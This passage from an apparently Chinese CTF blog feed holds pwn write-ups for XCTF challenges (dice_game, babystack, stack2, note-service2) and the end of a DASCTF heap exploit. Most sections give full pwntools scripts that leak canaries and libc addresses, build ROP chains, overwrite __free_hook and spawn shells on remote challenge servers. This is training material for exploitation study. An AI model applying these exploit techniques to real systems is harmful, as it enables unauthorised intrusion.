class="line">p.recvuntil(<span class="string">&#x27;house:\n&#x27;</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x2a0</span></span><br><span class="line">log.info(<span class="string">&#x27;HEAP:&#x27;</span>+ <span class="built_in">hex</span>(heap_base))</span><br><span class="line">buy(<span class="number">0x10</span>,p64(heap_base+<span class="number">0x2e0</span>))</span><br><span class="line">buy(<span class="number">0x40</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">buy(<span class="number">0x10</span>,p64(elf.got[<span class="string">&#x27;malloc&#x27;</span>]))<span class="comment">#chunk1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;house:\n&#x27;</span>)</span><br><span class="line">malloc_leak = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;malloc_leak:&quot;</span>+<span class="built_in">hex</span>(malloc_leak))</span><br><span class="line"></span><br><span class="line">libc_base = malloc_leak - libc.symbols[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;__free_hook:&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">sell(<span class="number">3</span>)</span><br><span class="line">sell(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">buy(<span class="number">0x10</span>,p64(free_hook))</span><br><span class="line">buy(<span class="number">0x20</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">buy(<span class="number">0x10</span>,p64(system))</span><br><span class="line">sell(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> DASCTF </tag>
            
            <tag> 安恒 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界做题记录</title>
      <link href="archives/20e728e/"/>
      <url>archives/20e728e/</url>
      
        <content type="html"><![CDATA[<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h3><blockquote><p>题目来源： XCTF 4th-QCTF-2018</p></blockquote><p><strong>考点：栈溢出、混合编程</strong></p><h4 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h4><p>程序实现的是一个具有用户姓名输入的菜随机数程序。</p><h5 id="保护措施"><a href="#保护措施" class="headerlink" title="保护措施"></a>保护措施</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">````</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#### 栈溢出</span></span></span><br><span class="line"></span><br><span class="line">一开始我在纠结是输入数字时使用的是**短整型**，可不可能是整型溢出，这样既能保持低位数字符合要求，又能控制 rip 跳转到后门。一时想不起来是那一条题和这条很相似的，就这样怀疑。</span><br><span class="line"></span><br><span class="line">最后观察是这里存在栈溢出：</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[55]; // [rsp+0h] [rbp-50h]</span><br><span class="line">  char v5; // [rsp+37h] [rbp-19h]</span><br><span class="line">  ssize_t v6; // [rsp+38h] [rbp-18h]</span><br><span class="line">  unsigned int seed[2]; // [rsp+40h] [rbp-10h]</span><br><span class="line">  unsigned int v8; // [rsp+4Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  memset(buf, 0, 0x30uLL);</span><br><span class="line">  *(_QWORD *)seed = time(0LL);                  // 随机种子</span><br><span class="line">  printf(&quot;Welcome, let me know your name: &quot;, a2);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  v6 = read(0, buf, 0x50uLL);//栈溢出</span><br><span class="line">  if ( v6 &lt;= 49 )                               // 字符长度小于等于49</span><br><span class="line">    buf[v6 - 1] = 0;                            // 最后一个字符替换为\x00</span><br><span class="line">  printf(&quot;Hi, %s. Let&#x27;s play a game.\n&quot;, buf);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  srand(seed[0]);</span><br><span class="line">…………</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是个小范围的栈溢出，可以覆盖随机数 seed 。做到这里发现和这条题目完全一样：[guess_num](# guess_num)。</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>固定随机数之后，就是 python c 的联合编程，用 <code>ctypes</code>实现。</p><p><code>rand</code>缺省种子参数时默认使用种子为：<code>0</code>。</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;124.126.19.106&quot;</span>,<span class="number">45292</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./dice_game&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./dice_game&quot;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;skye&#x27;</span>.ljust(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>) + p64(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Give me the point&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p><strong>考点：栈溢出，canary绕过</strong></p><h4 id="基本情况-1"><a href="#基本情况-1" class="headerlink" title="基本情况"></a>基本情况</h4><p>程序实现功能是往栈上读写数据。</p><h5 id="保护措施-1"><a href="#保护措施-1" class="headerlink" title="保护措施"></a>保护措施</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h5 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v3 = my_input();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        read(<span class="number">0</span>, &amp;s, <span class="number">0x100</span>uLL);                  <span class="comment">// 栈溢出</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>栈溢出空间还是比较大的。</p><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>使用栈溢出覆盖 canary 最后一字节，读取出 canary ，成功绕过 canary 保护。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak canary</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x89</span></span><br><span class="line">add(payload)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x89</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">canary = u64(<span class="string">&#x27;\x00&#x27;</span>+p.recv(<span class="number">7</span>))</span><br><span class="line">log.success(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br></pre></td></tr></table></figure><p>题目没有预留后门，并提供 libc ，所以泄露 libc 调用 onegadget getshell 。泄露 libc 需要借助输出函数，即需要控制 rip 调用。</p><p>泄露 libc 还需要 rop 回到 main 执行下一步操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(canary) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(start_addr)</span><br><span class="line">add(payload)</span><br><span class="line">leave()</span><br><span class="line">puts_leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;puts_leak:&quot;</span>+<span class="built_in">hex</span>(puts_leak))</span><br></pre></td></tr></table></figure><p>最后再次控制 rip 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get shell</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(canary) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(onegadget)</span><br><span class="line">add(payload)</span><br><span class="line">leave()</span><br></pre></td></tr></table></figure><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./babystack&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;124.126.19.106&quot;</span>,<span class="number">51939</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./babystack&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">context</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.send(context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak canary</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x89</span></span><br><span class="line">add(payload)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x89</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">canary = u64(<span class="string">&#x27;\x00&#x27;</span>+p.recv(<span class="number">7</span>))</span><br><span class="line">log.success(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400a93</span></span><br><span class="line">start_addr = <span class="number">0x400720</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(canary) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(start_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(payload)</span><br><span class="line">leave()</span><br><span class="line">puts_leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;puts_leak:&quot;</span>+<span class="built_in">hex</span>(puts_leak))</span><br><span class="line"></span><br><span class="line">libc_base = puts_leak - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">onegadget = libc_base + <span class="number">0x45216</span></span><br><span class="line">log.success(<span class="string">&quot;onegadget:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(canary) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(onegadget)</span><br><span class="line"></span><br><span class="line">add(payload)</span><br><span class="line">leave()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h3 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h3><blockquote><p>题目来源： XCTF 4th-QCTF-2018</p></blockquote><p>[collapse title=”展开查看详情” status=”false”]</p><p><strong>考点：数字下标溢出</strong></p><p>保护情况：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>漏洞函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;which number to change:&quot;</span>);          <span class="comment">// change</span></span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;index);<span class="comment">//没有检查下标</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;new number:&quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line">num_list[index] = num;</span><br></pre></td></tr></table></figure><p>程序中找到有预留的后门函数，所以通过数组越界修改返回地址到后门。所以需要寻找 num_list 与 eip 的偏移。</p><p>寻找 eip 在栈上地址比较容易，将断点打在 main 退出前（0x080488EF），查看寄存器值：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0x0</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffcfa0 ◂— 0x1</span><br><span class="line"> EDX  0xf7fb887c (_IO_stdfile_0_lock) ◂— 0x0</span><br><span class="line"> EDI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> ESI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> EBP  0x0</span><br><span class="line"><span class="meta"> #</span><span class="bash"> 返回地址在栈上位置</span></span><br><span class="line"> ESP  0xffffcf9c —▸ 0xf7e1d637 (__libc_start_main+247) ◂— add    esp, 0x10</span><br><span class="line"> EIP  0x80488f2 (main+802) ◂— 0x669066c3</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0  80488f2 main+802</span><br><span class="line">   f 1 f7e1d637 __libc_start_main+247</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>写入地址在写入或者 show 操作汇编打断点，下面在录入时打断点找：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">080486B</span>D                 call    ___isoc99_scanf</span><br><span class="line"><span class="number">080486</span>C2                 add     esp, <span class="number">10</span>h</span><br><span class="line"><span class="number">080486</span>C5                 mov     eax, [ebp+num]</span><br><span class="line"><span class="number">080486</span>CB                 mov     ecx, eax</span><br><span class="line"><span class="number">080486</span>CD                 lea     edx, [ebp+num_list]<span class="comment">//写入栈上</span></span><br><span class="line"><span class="number">080486</span>D0                 mov     eax, [ebp+var_7C]</span><br><span class="line"><span class="number">080486</span>D3                 add     eax, edx</span><br><span class="line"><span class="number">080486</span>D5                 mov     [eax], cl</span><br><span class="line"><span class="number">080486</span>D7                 add     [ebp+var_7C], <span class="number">1</span></span><br></pre></td></tr></table></figure><p>调试查看寄存器找到地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0x56</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0x56</span><br><span class="line"><span class="meta"> #</span><span class="bash">写入地址</span></span><br><span class="line"> EDX  0xffffcf18 ◂— 0x45 /* &#x27;E&#x27; */</span><br><span class="line"> EDI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> ESI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> EBP  0xffffcf88 ◂— 0x0</span><br><span class="line"> ESP  0xffffcee0 —▸ 0xf7ffda74 —▸ 0xf7fd5470 —▸ 0xf7ffd918 ◂— 0x0</span><br><span class="line"> EIP  0x80486d0 (main+256) ◂— 0x184458b</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x80486c2 &lt;main+242&gt;    add    esp, 0x10</span><br><span class="line">   0x80486c5 &lt;main+245&gt;    mov    eax, dword ptr [ebp - 0x88]</span><br><span class="line">   0x80486cb &lt;main+251&gt;    mov    ecx, eax</span><br><span class="line">   0x80486cd &lt;main+253&gt;    lea    edx, [ebp - 0x70]</span><br><span class="line"> ► 0x80486d0 &lt;main+256&gt;    mov    eax, dword ptr [ebp - 0x7c]</span><br><span class="line">   0x80486d3 &lt;main+259&gt;    add    eax, edx</span><br><span class="line">   0x80486d5 &lt;main+261&gt;    mov    byte ptr [eax], cl</span><br><span class="line">   0x80486d7 &lt;main+263&gt;    add    dword ptr [ebp - 0x7c], 1</span><br><span class="line">   0x80486db &lt;main+267&gt;    mov    edx, dword ptr [ebp - 0x7c]</span><br><span class="line">   0x80486de &lt;main+270&gt;    mov    eax, dword ptr [ebp - 0x90]</span><br><span class="line">   0x80486e4 &lt;main+276&gt;    cmp    edx, eax</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>计算得出偏移：<code>0xffffcf9c</code>-<code>0xffffcf18</code>=<code>0x84</code></p><p><strong>后门函数只能本地打通，远程服务器没有 bash 指令。</strong>我就 ROP 和泄露 libc 地址了。看了大佬 wp 发现 <code>system(sh)</code>也能 getshell ，所以脚本如下：</p><p><strong>完整exp：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./stack2&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;124.126.19.106&quot;</span>,<span class="number">42070</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">index,context</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;exit&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;change&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;number&quot;</span>,<span class="built_in">str</span>(context))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;have:&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x45</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x56</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#system_plt</span></span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">0</span>,<span class="number">0x50</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">1</span>,<span class="number">0x84</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">2</span>,<span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">3</span>,<span class="number">0x08</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh</span></span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">8</span>,<span class="number">0x87</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">9</span>,<span class="number">0x89</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">10</span>,<span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">11</span>,<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;exit&quot;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h3 id="note-service2"><a href="#note-service2" class="headerlink" title="note-service2"></a>note-service2</h3><p>[collapse title=”展开查看详情” status=”false”]<br><strong>考点：堆上shellcode</strong></p><p>保护情况：NX 保护关闭</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RWX:      Has RWX 